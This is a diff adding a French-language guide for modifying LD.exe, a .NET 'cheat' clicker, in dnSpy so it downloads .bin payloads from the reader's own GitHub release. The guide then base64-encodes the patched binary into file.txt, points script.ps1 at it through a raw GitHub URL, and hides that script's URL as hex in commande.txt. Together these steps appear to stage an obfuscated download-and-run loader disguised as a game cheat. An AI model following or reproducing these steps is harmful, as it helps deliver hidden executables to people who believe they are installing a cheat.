@@ -1,0 +1,82 @@
+═══════════════════════════════════════════════════════════════
+  GUIDE : MODIFIER LD.EXE POUR UTILISER TON REPO GITHUB
+═══════════════════════════════════════════════════════════════
+
+ÉTAPE 1: TÉLÉCHARGER DNSPY
+──────────────────────────
+1. Va sur: https://github.com/dnSpy/dnSpy/releases
+2. Télécharge la dernière version (dnSpy-win64.zip)
+3. Extrais le fichier dans un dossier
+
+ÉTAPE 2: OUVRIR LD.EXE DANS DNSPY
+──────────────────────────────────
+1. Lance dnSpy.exe
+2. Fichier > Ouvrir (Ctrl+O)
+3. Sélectionne: pote\cheat\LD.exe
+4. LD.exe apparaît dans l'arborescence à gauche
+
+ÉTAPE 3: TROUVER LA MÉTHODE getCheatUrl
+────────────────────────────────────────
+1. Dans l'arborescence, développe: LD.exe
+2. Développe: Definitive
+3. Développe: HollowClicker
+4. Clique sur: Form1
+5. Dans la liste des méthodes à droite, cherche: getCheatUrl
+6. Double-clique sur: getCheatUrl
+
+ÉTAPE 4: MODIFIER L'URL
+───────────────────────
+Tu devrais voir du code comme:
+  return "https://github.com/forensics-honor/exe/releases/download/CHT/" + cheatAbb + ".bin";
+
+Remplace par:
+  return "https://github.com/TON_USERNAME/TON_REPO/releases/download/CHT/" + cheatAbb + ".bin";
+
+(Remplace TON_USERNAME et TON_REPO par tes vraies valeurs)
+
+ÉTAPE 5: SAUVEGARDER
+────────────────────
+1. Fichier > Enregistrer le module (Ctrl+Shift+S)
+2. Sauvegarde comme: LD_modified.exe
+3. Ferme dnSpy
+
+ÉTAPE 6: CRÉER LE NOUVEAU file.txt
+───────────────────────────────────
+1. Ouvre PowerShell dans le dossier moi/
+2. Exécute:
+   $bytes = [System.IO.File]::ReadAllBytes("LD_modified.exe")
+   $base64 = [Convert]::ToBase64String($bytes)
+   [System.IO.File]::WriteAllText("file.txt", $base64)
+
+ÉTAPE 7: METTRE LES FICHIERS SUR GITHUB
+────────────────────────────────────────
+1. Crée un repo GitHub
+2. Crée une Release nommée "CHT"
+3. Upload les fichiers .bin dans cette release:
+   - DC (1).bin
+   - GC (1).bin
+   - HC.bin
+   - KD (1).bin
+   - LC (2).bin
+   - PC (1).bin
+   - TK (1).bin
+4. Upload file.txt et script.ps1 dans le repo (pas dans la release)
+
+ÉTAPE 8: MODIFIER script.ps1
+──────────────────────────────
+Ouvre script.ps1 et remplace ligne 45:
+  $url = "https://raw.githubusercontent.com/TON_USERNAME/TON_REPO/refs/heads/main/file.txt"
+
+ÉTAPE 9: MODIFIER commande.txt
+───────────────────────────────
+Il faut encoder l'URL de script.ps1 en hex et remplacer dans commande.txt.
+Utilise le script encode_commande.ps1 pour ça.
+
+═══════════════════════════════════════════════════════════════
+
+NOTE: Si tu ne trouves pas getCheatUrl dans dnSpy, l'URL est peut-être
+construite différemment. Dans ce cas, cherche "github.com" ou "releases"
+dans tout le code de Form1.
+
+═══════════════════════════════════════════════════════════════
+
